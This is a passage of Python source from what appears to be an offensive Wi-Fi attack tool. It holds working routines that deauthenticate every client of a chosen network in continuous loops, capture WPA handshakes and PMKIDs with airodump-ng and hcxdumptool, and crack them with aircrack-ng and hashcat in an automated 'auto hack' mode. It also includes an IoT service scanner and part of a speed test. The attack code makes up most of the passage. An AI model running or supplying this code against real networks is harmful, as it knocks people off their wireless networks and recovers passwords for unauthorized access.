                                service_name,
                                service['type'],
                                "\n".join(service['addresses']),
                                str(service['port']),
                                service['first_seen']
                            )
                        
                        # Add scan time information
                        elapsed = int(time.time() - self.start_time)
                        remaining = max(self.scan_duration - elapsed, 0)
                        time_info = f"\n[bold yellow]Scan Time: {elapsed}s / {self.scan_duration}s (Remaining: {remaining}s)[/]"
                        
                        # Update display
                        self.console.clear()
                        self.console.print(f"\n[bold cyan]🔍 Scanning for IoT services in {self.target_network}...[/]")
                        self.console.print(Group(table, time_info))
                
                def update_service(self, zc, type_, name):
                    """Handle service updates"""
                    self.add_service(zc, type_, name)
                
                def remove_service(self, zc, type_, name):
                    if name in self.discovered_services:
                        del self.discovered_services[name]

            zeroconf = Zeroconf()
            listener = IoTListener(self.console, ip_block)
            
            service_types = [
                "_http._tcp.local.",
                "_https._tcp.local.",
                "_ipp._tcp.local.",
                "_printer._tcp.local.",
                "_airplay._tcp.local.",
                "_spotify-connect._tcp.local.",
                "_googlecast._tcp.local.",
                "_hue._tcp.local.",
                "_homekit._tcp.local.",
                "_smb._tcp.local.",
                "_mqtt._tcp.local.",
                "_nest-camera._tcp.local.",
                "_sonos._tcp.local.",
                "_raop._tcp.local."
            ]
            
            try:
                self.console.print(f"\n[bold cyan]🔍 Starting IoT service discovery in {ip_block}...[/]")
                self.console.print("[yellow]Press Ctrl+C to stop scanning[/]")
                browsers = [ServiceBrowser(zeroconf, service_type, listener) for service_type in service_types]
                
                # Wait for scan duration or until Ctrl+C
                start_time = time.time()
                try:
                    while (time.time() - start_time) < 15:  # 15 seconds scan
                        time.sleep(0.1)
                except KeyboardInterrupt:
                    self.console.print("\n[bold yellow]Scan stopped by user![/]")
                
                # Show final results
                if listener.discovered_services:
                    self.console.print("\n[bold green]✓ Scan completed![/]")
                else:
                    self.console.print("\n[yellow]No IoT services found in the specified network.[/]")
                    
            except Exception as e:
                self.console.print(f"\n[bold red]Error during IoT scan: {str(e)}[/]")
            finally:
                zeroconf.close()
        
        elif choice == "0":
            return
        
        input("\nPress Enter to continue...")

    def capture_handshake(self):
        """Captures WPA/WPA2/WPA3 handshake"""
        if not self.selected_network:
            self.console.print("[bold red]Please select a target network first![/]")
            return

        network = self.networks[self.selected_network]
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Create directories in application directory
        tmp_dir = TMP_DIR
        handshake_dir = HANDSHAKE_DIR
        tmp_dir.mkdir(exist_ok=True)
        handshake_dir.mkdir(exist_ok=True)
        
        output_file = handshake_dir / f"handshake_{network['ssid']}_{timestamp}"
        handshake_found = False
        dump_proc = None
        pmkid_proc = None
        start_time = time.time()
        
        # Initialize client tracking
        known_clients = set(network['clients'])
        last_client_check = time.time()
        client_check_interval = 5  # Check for new clients every 5 seconds
        
        # Create a thread lock for client set manipulation
        client_lock = threading.Lock()
        
        # Check security type
        is_wpa3 = False
        if 'cipher' in network:
            if "WPA3" in network['cipher']:
                is_wpa3 = True
        
        if is_wpa3:
            self.console.print("[bold blue]WPA3 network detected. Using specialized capture method...[/]")
            self.logger.info(f"WPA3 handshake capture started for {network['ssid']}")

        # Display important information to the user
        self.console.print("\n[bold yellow]Important Information:[/]")
        self.console.print("[bold cyan]- Handshake capture will continue until you press Ctrl+C")
        self.console.print("[bold cyan]- If a handshake is found, it will be saved but the process will continue")
        self.console.print("[bold cyan]- Any new clients connecting to the network will be automatically targeted")
        self.console.print("[bold cyan]- All clients will be deauthenticated simultaneously\n")

        def create_status_table():
            """Creates and updates status table with current information"""
            current_time = time.time()
            elapsed_time = int(current_time - start_time)
            
            hours = elapsed_time // 3600
            minutes = (elapsed_time % 3600) // 60
            seconds = elapsed_time % 60
            elapsed_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
            
            # Create main table
            table = Table(show_header=True, header_style="bold magenta")
            table.add_column("BSSID", style="cyan")
            table.add_column("Channel", style="green")
            table.add_column("ESSID", style="yellow")
            table.add_column("Clients", style="cyan")
            table.add_column("Status", style="green")
            table.add_column("Time Elapsed", style="yellow")
            table.add_column("Security", style="magenta")

            with client_lock:
                status = "[bold green]✓ Handshake Found! (Continuing...)" if handshake_found else "[bold yellow]Capturing..."
                security = "[bold cyan]WPA3" if is_wpa3 else "[bold yellow]WPA/WPA2"
                table.add_row(
                    self.selected_network,
                    str(network['channel']),
                    network['ssid'],
                    str(len(known_clients)),
                    status,
                    elapsed_str,
                    security
                )

            return table
            
        # Function to deauthenticate a single client
        def deauth_client(client_mac):
            try:
                subprocess.run(
                    aireplay_deauth(self.interface_name, bssid=self.selected_network, count=2, client=client_mac),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=30,
                )
                return True
            except Exception as e:
                self.logger.error(f"Error deauthenticating client {client_mac}: {str(e)}")
                return False
                
        # Function to deauthenticate all clients in parallel
        def deauth_all_clients():
            with client_lock:
                clients_list = list(known_clients)
                
            # Use thread pool to deauth clients in parallel
            with ThreadPoolExecutor(max_workers=min(10, len(clients_list) + 1)) as executor:
                # Submit deauth tasks for all clients
                client_futures = {executor.submit(deauth_client, client): client for client in clients_list}
                
                # Also submit broadcast deauth
                broadcast_future = executor.submit(
                    subprocess.run,
                    aireplay_deauth(self.interface_name, bssid=self.selected_network, count=2),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                
                # Wait for all tasks to complete
                for future in concurrent.futures.as_completed(client_futures):
                    client = client_futures[future]
                    try:
                        success = future.result()
                        if not success:
                            self.logger.warning(f"Failed to deauth client: {client}")
                    except Exception as e:
                        self.logger.error(f"Exception deauthing client {client}: {str(e)}")
                
                # Check broadcast result
                try:
                    broadcast_future.result()
                except Exception as e:
                    self.logger.error(f"Exception during broadcast deauth: {str(e)}")
        
        # Function to check for new clients connected to the network
        def check_for_new_clients():
            nonlocal last_client_check
            current_time = time.time()
            
            # Only check periodically to avoid excessive processing
            if current_time - last_client_check < client_check_interval:
                return
                
            last_client_check = current_time
            
            # Get latest network information
            with self._networks_lock:
                if self.selected_network in self.networks:
                    current_clients = set(self.networks[self.selected_network]['clients'])
                    
                    # Check for new clients
                    with client_lock:
                        new_clients = current_clients - known_clients
                        if new_clients:
                            self.console.print(f"[bold green]Detected {len(new_clients)} new clients! Targeting them...[/]")
                            for new_client in new_clients:
                                self.logger.info(f"New client detected: {new_client}")
                            known_clients.update(new_clients)

        # Function to check for captured handshake
        def check_for_handshake():
            nonlocal handshake_found
            
            if handshake_found:
                return True
                
            cap_files = list(handshake_dir.glob(f"handshake_{network['ssid']}_{timestamp}*.cap"))
            if not cap_files:
                return False
                
            found = False
            
            if is_wpa3:
                # For WPA3, check differently as aircrack might not report handshake properly
                try:
                    result = subprocess.run(["wpaclean", "check_temp.cap", str(cap_files[0])], 
                                          capture_output=True, text=True)
                    found = "handshake" in result.stdout.lower() or os.path.getsize("check_temp.cap") > 24
                    if os.path.exists("check_temp.cap"):
                        os.remove("check_temp.cap")
                except:
                    # Fallback to standard check if wpaclean isn't available
                    result = subprocess.run(aircrack_check(cap_files[0]), capture_output=True, text=True)
                    found = has_aircrack_handshake(result.stdout)
            else:
                # Standard WPA/WPA2 check
                result = subprocess.run(aircrack_check(cap_files[0]), capture_output=True, text=True)
                found = has_aircrack_handshake(result.stdout)
                
            if found and not handshake_found:
                # First time finding handshake
                handshake_found = True
                
                # Save the handshake file
                final_file = handshake_dir / f"handshake_{network['ssid']}_{timestamp}.cap"
                shutil.move(str(cap_files[0]), str(final_file))
                security_type = "WPA3" if is_wpa3 else "WPA/WPA2"
                
                self.console.print(f"\n[bold green]Handshake ({security_type}) captured successfully! Saved to: {final_file}[/]")
                self.console.print("[bold yellow]Continuing capture process for additional handshakes... Press Ctrl+C to stop.[/]")
                self.logger.info(f"{security_type} handshake captured and saved to {final_file}")
                
                # Return True to indicate a handshake was found (but we continue)
                return True
                
            return found

        try:
            with Live(refresh_per_second=4) as live:
                # Start listening with airodump-ng with specialized options for WPA3 if needed
                dump_proc = subprocess.Popen(
                    airodump_capture(
                        self.interface_name,
                        channel=network['channel'],
                        bssid=self.selected_network,
                        output_prefix=output_file,
                        wpa3=is_wpa3,
                    ),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )

                # Main capture loop - continues until Ctrl+C is pressed
                while True:
                    # Update status display
                    live.update(create_status_table())
                    live.refresh()

                    # Check for new clients
                    check_for_new_clients()

                    # Deauth all clients in parallel
                    deauth_all_clients()

                    # Check for handshake
                    check_for_handshake()  # Note: We don't break even if handshake is found
                        
                    # Small sleep to prevent high CPU usage
                    time.sleep(0.25)

        except KeyboardInterrupt:
            if handshake_found:
                self.console.print("\n[bold green]Handshake capture process stopped by user. Handshake was already captured successfully![/]")
            else:
                self.console.print("\n[bold yellow]Handshake capture operation stopped by user. No handshake was captured.[/]")
        except Exception as e:
            self.console.print(f"\n[bold red]Error: {str(e)}[/]")
            self.logger.error(f"Error in handshake capture: {str(e)}")
        finally:
            # Cleanup processes
            if dump_proc:
                try:
                    dump_proc.terminate()
                    dump_proc.wait(timeout=2)
                except:
                    try:
                        dump_proc.kill()
                        dump_proc.wait(timeout=1)
                    except:
                        pass
                    
            if pmkid_proc:
                try:
                    # Send SIGTERM followed by SIGKILL
                    pmkid_proc.terminate()  # SIGTERM
                    try:
                        pmkid_proc.wait(timeout=2)
                    except subprocess.TimeoutExpired:
                        pmkid_proc.kill()   # SIGKILL
                        try:
                            pmkid_proc.wait(timeout=2)
                        except:
                            pass
                except:
                    # As a last resort, use pkill directly
                    try:
                        subprocess.run(["pkill", "-9", "-f", f"hcxdumptool.*{self.selected_network}"], 
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    except:
                        pass
            
            # Clean temporary files
            for ext in [".csv", ".netxml", "-01.cap"]:
                for f in handshake_dir.glob(f"handshake_{network['ssid']}_{timestamp}*{ext}"):
                    try:
                        f.unlink()
                    except:
                        pass
            
            security_type = "WPA3" if is_wpa3 else "WPA/WPA2"
            self.logger.info(f"{security_type} handshake capture completed: {'Successful' if handshake_found else 'Failed'}")
            # Ensure menu state is properly reset
            self.current_menu = "attack"

    def _auto_hack_single_network(self, bssid, network, session_dir, wordlist):
        """Helper function for auto_hack to attack a single network in parallel"""
        dump_proc = None
        pmkid_proc = None
        
        # Deep copy network to avoid modifying original
        try:
            # Safe network data extraction
            if network is None:
                network = {}
                
            ssid = str(network.get('ssid', 'Unknown'))
            channel = 1
            try:
                channel = int(network.get('channel', 1))
            except:
                pass
                
            clients = set()
            try:
                client_data = network.get('clients', [])
                if client_data:
                    clients = set(client_data)
            except:
                pass
                
            cipher = str(network.get('cipher', 'Unknown'))
            
            # Log start of attack
            self.logger.info(f"Starting attack on {ssid} ({bssid})")
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            network_dir = session_dir / f"{ssid}_{bssid.replace(':', '')}"
            network_dir.mkdir(parents=True, exist_ok=True)
            
            result = {
                'status_message': "⏳ Attack in Progress",
                'handshake_status': "[yellow]⏳ Trying",
                'pmkid_status': "[yellow]⏳ Trying",
                'password': None,
                'handshake_file': None,
                'pmkid_file': None
            }
            
            # Create files for captures
            handshake_file = network_dir / f"handshake_{timestamp}"
            pmkid_file = network_dir / f"pmkid_{timestamp}"
            pmkid_pcapng = pmkid_file.with_suffix(".pcapng")
            pmkid_22000 = pmkid_file.with_suffix(".22000")
            
            # Start handshake capture
            dump_proc = subprocess.Popen(
                airodump_capture(
                    self.interface_name,
                    channel=channel,
                    bssid=bssid,
                    output_prefix=handshake_file,
                ),
                stdout=subprocess.DEVNULL,
                stderr=subprocess.PIPE,
            )
            
            # Check if handshake capture started successfully
            time.sleep(1)
            if dump_proc.poll() is not None:
                stderr = dump_proc.stderr.read().decode() if dump_proc.stderr else "Unknown error"
                self.logger.error(f"Failed to start airodump-ng for {ssid}: {stderr}")
                result['status_message'] = "[bold red]✗ Failed to start handshake capture[/]"
                # Continue anyway, we might at least get PMKID
            
            # Start PMKID capture
            pmkid_proc = subprocess.Popen(
                hcxdumptool_capture(self.interface_name, pmkid_pcapng, channel),
                stdout=subprocess.DEVNULL,
                stderr=subprocess.PIPE,
            )
            
            # Check if PMKID capture started successfully
            time.sleep(1)
            if pmkid_proc.poll() is not None:
                stderr = pmkid_proc.stderr.read().decode() if pmkid_proc.stderr else "Unknown error"
                self.logger.error(f"Failed to start hcxdumptool for {ssid}: {stderr}")
                result['pmkid_status'] = "[red]✗ Failed to start PMKID capture[/]"
                # Continue anyway with just handshake capture
            
            # Log attempt details
            with open(session_dir / "auto_hack_report.txt", "a") as f:
                f.write(f"Attack on {ssid} ({bssid}) started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"  Channel: {channel}\n")
                f.write(f"  Security: {cipher}\n")
                f.write(f"  Clients: {len(clients)}\n")
                f.write(f"  Client MACs: {', '.join(clients) if clients else 'None'}\n")

            # IMPROVED: Send deauth packets to all clients simultaneously (up to 10)
            with ThreadPoolExecutor(max_workers=min(10, len(clients))) as deauth_executor:
                deauth_tasks = []
                
                for client in clients:
                    deauth_tasks.append(deauth_executor.submit(
                        subprocess.run,
                        aireplay_deauth(self.interface_name, bssid=bssid, count=5, client=client),
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                        timeout=10  # Add 10 second timeout
                    ))
                
                # Wait for deauth tasks to complete
                for task in concurrent.futures.as_completed(deauth_tasks):
                    try:
                        task.result()  # Just to ensure we catch any exceptions
                    except Exception as e:
                        self.logger.error(f"Deauth error for {ssid}: {str(e)}")
            
            # Modified: Wait for captures with minimum 3 minute (180 seconds) capture time
            # This ensures we give each network enough time for capture
            min_capture_time = 180  # 3 minutes in seconds
            capture_start_time = time.time()
            
            handshake_found = False
            pmkid_found = False
            password_found = False
            
            # Log minimum capture time
            self.logger.info(f"Minimum capture time for {ssid}: {min_capture_time} seconds")
            
            # Loop until minimum time passes or we find a handshake/PMKID
            while True:
                # Calculate elapsed time
                current_time = time.time()
                elapsed_time = current_time - capture_start_time
                
                # Update status message with time remaining if still under minimum time
                if elapsed_time < min_capture_time:
                    time_remaining = min_capture_time - elapsed_time
                    minutes_remaining = int(time_remaining // 60)
                    seconds_remaining = int(time_remaining % 60)
                    result['status_message'] = f"⏳ Attack in Progress - {minutes_remaining:02d}:{seconds_remaining:02d} remaining"
                else:
                    result['status_message'] = "⏳ Attack in Progress - Finalizing"
                
                # Check for handshake
                if not handshake_found:
                    cap_files = list(network_dir.glob(f"{handshake_file.name}*.cap"))
                    if cap_files:
                        check_result = subprocess.run(aircrack_check(cap_files[0]),
                                                   capture_output=True, text=True)
                        
                        if has_aircrack_handshake(check_result.stdout):
                            # Verify handshake with thorough methods
                            is_valid_handshake = self._verify_handshake(cap_files[0], bssid, ssid)
                            
                            if is_valid_handshake:
                                handshake_found = True
                                result['handshake_status'] = "[green]✓ Captured"
                                result['handshake_file'] = str(cap_files[0])
                                self.logger.info(f"Verified handshake captured for {ssid} after {elapsed_time:.2f} seconds")
                            else:
                                self.logger.warning(f"Potential handshake found but failed verification for {ssid}")
                                result['handshake_status'] = "[yellow]⚠️ Needs verification"
                
                # Check for PMKID
                if not pmkid_found:
                    if pmkid_pcapng.exists():
                        subprocess.run(hcxpcapngtool_convert(pmkid_22000, pmkid_pcapng), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        
                        if pmkid_22000.exists() and pmkid_22000.stat().st_size > 0:
                            # Verify PMKID with thorough methods
                            is_valid_pmkid = self._verify_pmkid(pmkid_22000, bssid)
                            
                            if is_valid_pmkid:
                                pmkid_found = True
                                result['pmkid_status'] = "[green]✓ Captured"
                                result['pmkid_file'] = str(pmkid_22000)
                                self.logger.info(f"Verified PMKID captured for {ssid} after {elapsed_time:.2f} seconds")
                            else:
                                self.logger.warning(f"Potential PMKID found but failed verification for {ssid}")
                                result['pmkid_status'] = "[yellow]⚠️ Needs verification"
                
                # Send additional deauth packets every 30 seconds if we haven't found anything yet
                if not handshake_found and not pmkid_found and elapsed_time % 30 < 1 and clients:
                    self.logger.info(f"Sending additional deauth packets for {ssid}")
                    for client in clients:
                        subprocess.run(
                            aireplay_deauth(self.interface_name, bssid=bssid, count=3, client=client),
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                        )
                
                # Check if we can exit the loop early (we've passed min time AND found something)
                if elapsed_time >= min_capture_time and (handshake_found or pmkid_found):
                    self.logger.info(f"Early exit for {ssid}: Minimum time reached and data captured")
                    break
                    
                # Always exit after 5 minutes (300 seconds) maximum to prevent hanging
                if elapsed_time >= 300:  # 5 minutes maximum
                    self.logger.info(f"Maximum capture time reached for {ssid}")
                    break
                    
                # Brief wait before next check
                time.sleep(5)
            
            # Log capture completion
            self.logger.info(f"Capture completed for {ssid} - Handshake: {handshake_found}, PMKID: {pmkid_found}")
            
            # Try to crack if we found anything
            if handshake_found and wordlist:
                cap_files = list(network_dir.glob(f"{handshake_file.name}*.cap"))
                if cap_files:
                    self.logger.info(f"Attempting to crack handshake for {ssid}")
                    crack_result = subprocess.run(aircrack_crack(cap_files[0], wordlist),
                                               capture_output=True, text=True)
                    password = extract_wifi_password(crack_result.stdout, include_hashcat=False)
                    if password:
                        password_found = True
                        result['password'] = password
                        result['status_message'] = "[bold green]✓ Attack Successful - Password Found!"
                        self.logger.info(f"Password found from handshake for {ssid}: {password}")
            
            # Try PMKID cracking if we have PMKID and no password yet
            if not password_found and pmkid_found and wordlist:
                if pmkid_22000.exists():
                    self.logger.info(f"Attempting to crack PMKID for {ssid}")
                    hashcat_result = subprocess.run(
                        hashcat_crack(pmkid_22000, wordlist, mode=22000, workload=0, status=True, potfile_disable=True),
                        capture_output=True, text=True)
                    
                    password = extract_hashcat_password_for_bssid(hashcat_result.stdout, bssid)
                    if password:
                        password_found = True
                        result['password'] = password
                        result['status_message'] = "[bold green]✓ Attack Successful - Password Found!"
                        self.logger.info(f"Password found from PMKID for {ssid}: {password}")
            
            # If we didn't find the password but found a handshake or PMKID, update status
            if not password_found:
                if handshake_found or pmkid_found:
                    result['status_message'] = "[yellow]⚠️ Captured data but couldn't crack password"
                    
                    # If we have a wordlist, suggest better wordlist
                    if wordlist:
                        result['status_message'] += " - Try larger wordlist"
                else:
                    result['status_message'] = "[red]✗ Attack Failed - No handshake or PMKID captured"
                    result['handshake_status'] = "[red]✗ Failed"
                    result['pmkid_status'] = "[red]✗ Failed"
            
            # Log final results
            with open(session_dir / "auto_hack_report.txt", "a") as f:
                f.write(f"Attack on {ssid} completed at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"  Handshake: {'Captured' if handshake_found else 'Failed'}\n")
                f.write(f"  PMKID: {'Captured' if pmkid_found else 'Failed'}\n")
                f.write(f"  Password: {result['password'] if result['password'] else 'Not found'}\n\n")
            
            self.logger.info(f"Attack on {ssid} completed. Password found: {password_found}")
            return result
            
        except Exception as e:
            error_msg = f"Error in _auto_hack_single_network for {network.get('ssid', 'Unknown') if isinstance(network, dict) else 'Unknown'}: {str(e)}"
            self.logger.error(error_msg)
            return {
                'status_message': f"[bold red]✗ Error: {str(e)}[/]",
                'handshake_status': "[red]✗ Failed",
                'pmkid_status': "[red]✗ Failed",
                'password': None,
                'handshake_file': None,
                'pmkid_file': None
            }
        finally:
            # Cleanup processes
            if dump_proc:
                try:
                    dump_proc.terminate()
                    dump_proc.wait(timeout=1)
                except:
                    try:
                        dump_proc.kill()
                        dump_proc.wait(timeout=1)
                    except:
                        pass
                    
            if pmkid_proc:
                try:
                    # Send SIGTERM followed by SIGKILL
                    pmkid_proc.terminate()  # SIGTERM
                    try:
                        pmkid_proc.wait(timeout=2)
                    except subprocess.TimeoutExpired:
                        pmkid_proc.kill()   # SIGKILL
                        try:
                            pmkid_proc.wait(timeout=2)
                        except:
                            pass
                except:
                    # As a last resort, use pkill directly
                    try:
                        subprocess.run(["pkill", "-9", "-f", f"hcxdumptool.*{bssid}"], 
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    except:
                        pass

    def _auto_hack_cleanup(self):
        """Safe cleanup for auto hack mode"""
        try:
            # Kill all related processes immediately
            processes_to_kill = ["airodump-ng", "aireplay-ng", "hcxdumptool", "hashcat", "aircrack-ng"]
            for proc in processes_to_kill:
                try:
                    # First try normal termination
                    subprocess.run(["pkill", "-f", proc], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    # Wait 1 second
                    time.sleep(1)
                    # If still running, force termination
                    subprocess.run(["pkill", "-9", "-f", proc], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except:
                    pass
            
            # Attempt to clean zombie processes
            try:
                # Try to clean zombie processes
                subprocess.run(["pkill", "-9", "-f", "defunct"], 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass
            
            # Additional cleanup specifically for hcxdumptool and airodump-ng
            try:
                # Try more targeted hcxdumptool cleanup
                subprocess.run(["pkill", "-9", "-f", "hcxdumptool"], 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                # Ensure airodump-ng processes are killed
                subprocess.run(["pkill", "-9", "-f", "airodump-ng"], 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                # Also kill any other related processes that might be left
                subprocess.run(["pkill", "-9", "-f", "aireplay-ng"], 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass

            # Disable monitor mode and restart network manager if needed
            try:
                airmon_check = subprocess.run(["airmon-ng", "check"], capture_output=True, text=True)
                if "PID" in airmon_check.stdout and "Name" in airmon_check.stdout:
                    self.logger.info("Killing leftover network-related processes")
                    subprocess.run(["airmon-ng", "check", "kill"], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass
            
            # Log completion of cleanup
            self.logger.info("Auto hack cleanup completed")
            
        except Exception as e:
            self.logger.error(f"Error during cleanup: {str(e)}")
            # As a last resort, try to kill everything related one more time
            try:
                subprocess.run(["pkill", "-9", "-f", "air"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(["pkill", "-9", "-f", "hcx"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(["pkill", "-9", "-f", "hashcat"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass

    def _kill_processes(self, process_names):
        """Kill specific processes by name"""
        # For each attack process, first terminate them gracefully
        for proc_name in process_names:
            try:
                # First normal termination (SIGTERM)
                subprocess.run(["pkill", "-f", proc_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                # Short wait
                time.sleep(0.5)
                
                # Force termination for any still running (SIGKILL)
                subprocess.run(["pkill", "-9", "-f", proc_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
            except Exception as e:
                self.logger.error(f"Error killing {proc_name}: {str(e)}")
                
        # Clean up zombie processes
        try:
            subprocess.run(["pkill", "-9", "-f", "defunct"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

    def deauth_all_clients(self):
        """Deauthenticate all clients connected to the selected network"""
        if not self.selected_network:
            self.console.print("[bold red]Please select a target network first![/]")
            return
            
        network = self.networks[self.selected_network]
        clients = network['clients']
        
        if not clients:
            self.console.print("[bold yellow]No clients connected to this network.[/]")
            return
            
        self.console.print(f"[bold yellow]Starting deauthentication attack on all clients of {network['ssid']}...[/]")
        self.console.print("[bold red]⚠️ This attack will continue until you press Ctrl+C to stop it! ⚠️[/]")
        
        # Start time of attack
        start_time = time.time()
        round_count = 0
        
        try:
            while True:  # Continue until Ctrl+C
                round_count += 1
                
                # Calculate elapsed time
                elapsed = int(time.time() - start_time)
                minutes = elapsed // 60
                seconds = elapsed % 60
                duration = f"{minutes:02d}:{seconds:02d}"
                
                # Print round header with duration
                self.console.print(f"\n[bold yellow]--- Round {round_count} | Duration: {duration} ---[/]")
                
                # Broadcast deauth
                self.console.print(f"[bold cyan]Broadcasting deauth to all clients on {network['ssid']}...[/]")
                subprocess.run(
                    aireplay_deauth(self.interface_name, bssid=self.selected_network, count=2),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=30,
                )
                
                # Targeted deauth to each client
                self.console.print(f"[bold green]Targeting individual clients ({len(clients)}):[/]")
                
                for i, client in enumerate(clients, 1):
                    subprocess.run(
                        aireplay_deauth(self.interface_name, bssid=self.selected_network, count=2, client=client),
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        timeout=30,
                    )
                    
                    # Print progress
                    self.console.print(f"  [green]{i}/{len(clients)}[/] - Deauthing client: [cyan]{client}[/]")
                    
                    # Small delay between clients
                    time.sleep(0.1)
                
                # Round complete status
                self.console.print(f"[bold yellow]Round {round_count} complete - {len(clients)} clients deauthenticated[/]")
                self.console.print("[bold red]Press Ctrl+C to stop the attack[/]")
                
                # Wait before next round
                time.sleep(1.5)
                
        except KeyboardInterrupt:
            self.console.print("\n[bold green]Deauthentication attack stopped by user![/]")
            self.logger.info(f"Deauthentication attack stopped after {round_count} rounds")
        except Exception as e:
            self.console.print(f"\n[bold red]Error during deauthentication: {str(e)}[/]")
            self.logger.error(f"Error during deauthentication: {str(e)}")
        
    def deauth_single_client(self):
        """Deauthenticate a specific client connected to the selected network"""
        if not self.selected_network:
            self.console.print("[bold red]Please select a target network first![/]")
            return
            
        network = self.networks[self.selected_network]
        clients = network['clients']
        
        if not clients:
            self.console.print("[bold yellow]No clients connected to this network.[/]")
            return
            
        # Display connected clients
        self.console.print(f"\n[bold yellow]Clients connected to {network['ssid']}:[/]")
        client_table = Table(show_header=True, header_style="bold magenta")
        client_table.add_column("ID", style="cyan", justify="center")
        client_table.add_column("MAC Address", style="green")
        
        for idx, client in enumerate(clients, 1):
            client_table.add_row(str(idx), client)
            
        self.console.print(client_table)
        
        
        # Let user select client
        choice = Prompt.ask("Select client ID to deauthenticate (0 to cancel)", 
                          choices=["0"] + [str(i) for i in range(1, len(clients) + 1)])
        
        if choice == "0":
            return
            
        selected_client = list(clients)[int(choice) - 1]
        
        # Start time of attack
        start_time = time.time()
        packet_count = 0
        
        self.console.print(f"\n[bold yellow]Starting targeted deauthentication attack against client: {selected_client}[/]")
        self.console.print("[bold red]⚠️ This attack will continue until you press Ctrl+C to stop it! ⚠️[/]")
        
        try:
            while True:  # Continue until Ctrl+C
                packet_count += 2  # Each deauth call sends 2 packets by default
                
                # Calculate elapsed time
                elapsed = int(time.time() - start_time)
                minutes = elapsed // 60
                seconds = elapsed % 60
                duration = f"{minutes:02d}:{seconds:02d}"
                
                # Send deauth packets
                subprocess.run(
                    aireplay_deauth(self.interface_name, bssid=self.selected_network, count=2, client=selected_client),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=30,
                )
                
                # Determine status message based on packets sent
                if packet_count < 10:
                    status = f"[yellow]Starting attack[/]"
                elif packet_count < 50:
                    status = f"[green]Attack in progress[/]"
                else:
                    status = f"[bold green]Attack effective[/]"
                
                # Print status update on a single line
                self.console.print(f"\r[cyan]Client: {selected_client}[/] | [green]Network: {network['ssid']}[/] | {status} | [blue]Packets: {packet_count}[/] | [red]Duration: {duration}[/] [bold red](Ctrl+C to stop)[/]", end="")
                
                # Small delay before next deauth
                time.sleep(1.0)
                
        except KeyboardInterrupt:
            self.console.print("\n\n[bold green]Targeted deauthentication attack stopped by user![/]")
            self.logger.info(f"Targeted deauthentication attack against {selected_client} stopped after {packet_count} packets")
        except Exception as e:
            self.console.print(f"\n\n[bold red]Error during deauthentication: {str(e)}[/]")
            self.logger.error(f"Error during deauthentication: {str(e)}")

    def speed_test(self):
        """Tests network connection speed using available methods"""
        self.console.clear()
        self.create_header()
        
        # Title and description
        title = Panel(
            "[bold cyan]Network Speed Test[/bold cyan]",
            border_style="blue",
            expand=False
        )
        self.console.print(title)
        self.console.print("[yellow]Testing your internet connection speed...[/yellow]")
        
        # Internet connection check
        self.console.print("\n[bold blue]Step 1:[/bold blue] Checking Internet Connection...")
        
        try:
            # Simple connection test
            test_connection = self.command_runner.run(
                ping_command(count=1, timeout_seconds=2),
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            if test_connection.returncode != 0:
                self.console.print("[bold red]❌ No internet connection detected![/]")
                self.console.print("[yellow]Please check your network connection and try again.[/]")
                self.console.print("\n[bold blue]Press Enter to return to the menu...[/]")
                input()
                return
            
            self.console.print("[bold green]✓ Internet connection detected![/]")
            
            # Start speedtest
            self.console.print("\n[bold blue]Step 2:[/bold blue] Starting Speed Test...")
            self.console.print("[yellow]This may take up to 30 seconds. Please wait...[/yellow]")

            download_time = 0.0
            upload_time = 0.0
            download_speed = 0.0
            upload_speed = 0.0
            
            # Progress bar display
            with Progress(
                SpinnerColumn(),
                TextColumn("[bold blue]{task.description}"),
                BarColumn(),
                TextColumn("[bold green]{task.percentage:.0f}%"),
                TimeElapsedColumn(),
            ) as progress:
                
                
                download_task = progress.add_task("[cyan]Testing Download Speed...", total=100)
                upload_task = progress.add_task("[magenta]Testing Upload Speed...", total=100, visible=False)
                
                # Download test
                start_time = time.time()
                download_result = self.command_runner.run(
                    curl_download_command(DOWNLOAD_TEST_BYTES),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.PIPE,
                    timeout=45,
                )
                download_time = time.time() - start_time
                if download_result.ok:
                    download_speed = bytes_to_mbytes_per_second(DOWNLOAD_TEST_BYTES, download_time)
                else:
                    self.logger.warning(f"Download test failed: {download_result.stderr}")
                
                # Progress simulation
                for i in range(100):
                    progress.update(download_task, completed=i + 1)
                    time.sleep(0.02)
                    
                # Show upload task
